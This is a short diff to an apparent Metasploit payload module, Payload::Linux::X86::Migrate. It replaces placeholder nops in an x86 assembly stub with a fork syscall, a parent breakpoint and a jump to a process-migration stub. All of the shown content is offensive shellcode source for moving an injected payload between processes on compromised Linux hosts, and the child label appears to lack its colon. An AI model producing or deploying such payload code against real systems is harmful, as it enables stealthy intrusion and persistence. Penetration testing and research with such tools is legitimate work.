@@ -26,10 +26,22 @@ module Payload::Linux::X86::Migrate
   # Constructs the migrate stub on the fly
   #
   def generate(opts={})
+    # eax - payload address
+    # ebx - current pid
+    # ecx - fd
     asm = %Q^
-      nop
-      nop
-      nop
+      push eax ; payload address
+      push ecx ; fd
+      push ebx ; current pid
+      xor eax, eax
+      push 0x2
+      pop eax
+      int 0x80
+      cmp eax, 0
+      jz _exec_child
+_exec_parent:
+      int 3
+_exec_child
       #{migrate_stub(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
